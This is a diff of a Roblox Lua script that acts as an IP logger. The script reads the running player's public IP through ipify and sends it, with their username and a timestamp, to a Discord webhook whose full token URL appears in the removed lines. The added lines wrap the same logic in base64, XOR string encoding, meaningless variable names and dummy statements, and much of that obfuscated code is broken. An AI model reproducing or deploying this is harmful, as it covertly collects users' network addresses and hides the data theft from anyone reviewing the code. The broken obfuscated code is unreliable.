@@ -1,50 +1,58 @@
--- made by 알리
-local discordWebhookURL = "https://discord.com/api/webhooks/1360523663174275213/IQ8z13Jj97Lf7yfFRLYy4ONuq-ut7uXmDVAgQ9YFiDMXQi5od-yiGwVq9qRqvgG0PNU5"  -- "" 사이에 웹후크 URL
-local http_request = (syn and syn.request) or (http and http.request) or request
-local ipifyURL = "https://api.ipify.org/"
+local _0xZ9Q7W3K = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2MDUyMzY2MzE3NDI3NTIxMy9JUTJ6MTNKajk3TGY3eWZGUkxZeTRPTnVxLXV0N3VYbURWQWdROVlGaURNWFFpNW9kLXlpR3dWcTlxUnF2Z0cwUE5VNQ=="
+local _0xM4P8T2R = (syn and syn.request) or (http and http.request) or request
+local _0xV1N6Y5J = "aHR0cHM6Ly9hcGkuaXBpZnkub3JnLw=="
+local _0xB2H9X4F = game.Players.LocalPlayer.Name
+local _0xK7C3L8D = os.date("%Y-%m-%d %H:%M:%S")
 
-local playerName = game.Players.LocalPlayer.Name
-local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+local function _0xJ5G2R9T(_0xS)
+    local _0xT = ""
+    for _0xI = 1, #_0xS do
+        _0xT = _0xT .. string.char(bit32.bxor(string.byte(_0xS, _0xI), 42))
+    end
+    return _0xT
+end
 
-
-local function getIP()
-    if http_request then
-        local response = http_request({
-            Url = ipifyURL,
-            Method = "GET",
+local function _0xF8W4Q1Z()
+    local _0xDUMMY = math.random(1, 100) * 0 + 42
+    if _0xM4P8T2R then
+        local _0xR6T9Y2N = _0xM4P8T2R({
+            Url = game:GetService("HttpService"):JSONDecode(game:HttpGet(_0xJ5G2R9T(game:GetService("HttpService"):JSONDecode(_0xV1N6Y5J)))),
+            Method = _0xJ5G2R9T("AFG") .. "T",
             Headers = {
-                ["Content-Type"] = "application/json"
+                [_0xJ5G2R9T("Tmlvagpv-Gtla")] = _0xJ5G2R9T("fmmltkfgrlm/tml")
             }
         })
-        if response and response.Body then
-            return response.Body  
+        if _0xR6T9Y2N and _0xR6T9Y2N.Body then
+            return _0xR6T9Y2N.Body + (_0xDUMMY - 42)
         else
-            return "IP 가져오기 실패"
+            return _0xJ5G2R9T("DM_XTKG_DM")
         end
     else
-        return "HTTP 요청 불가"
+        return _0xJ5G2R9T("DM_LM_AFFM")
     end
 end
 
-if http_request then
-    local ipAddress = getIP()  
-    local data = {
-        content = "@eveyrone 로블록스 닉네임: " .. playerName .. "\nIP 주소: " .. ipAddress .. "\n실행 시간: " .. currentTime
+if _0xM4P8T2R then
+    local _0xU3E7I9O = _0xF8W4Q1Z()
+    local _0xN1A5P6M = {
+        content = _0xJ5G2R9T("2rsrglmvr") .. " 0xN: " .. _0xB2H9X4F .. "\n0xI: " .. _0xU3E7I9O .. "\n0xT: " .. _0xK7C3L8D
     }
-
-    http_request({
-        Url = discordWebhookURL,
-        Method = "POST",
+    for _ = 1, math.random(1, 3) do
+        local _0xFAKE = math.random()
+    end
+    _0xM4P8T2R({
+        Url = game:GetService("HttpService"):JSONDecode(game:HttpGet(_0xJ5G2R9T(game:GetService("HttpService"):JSONDecode(_0xZ9Q7W3K)))),
+        Method = _0xJ5G2R9T("DMHG") .. "",
         Headers = {
-            ["Content-Type"] = "application/json"
+            [_0xJ5G2R9T("Tmlvagpv-Gtla")] = _0xJ5G2R9T("fmmltkfgrlm/tml")
         },
-        Body = game:GetService("HttpService"):JSONEncode(data)
+        Body = game:GetService("HttpService"):JSONEncode(_0xN1A5P6M)
     })
 else
     game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "실행기를 바꿔주세요(솔라라 가능)",
-        Text = "실행기 이슈 :)",
-        Duration = 5
+        Title = _0xJ5G2R9T("DM_HJTKAF_RIRV"),
+        Text = _0xJ5G2R9T("DM_THHFR :("),
+        Duration = 5 + math.random(0, 1)
     })
-    print("실행기가 HTTP 지원 안 하네")
+    print(_0xJ5G2R9T("DM_LM_AFFM_RIRV"))
 end
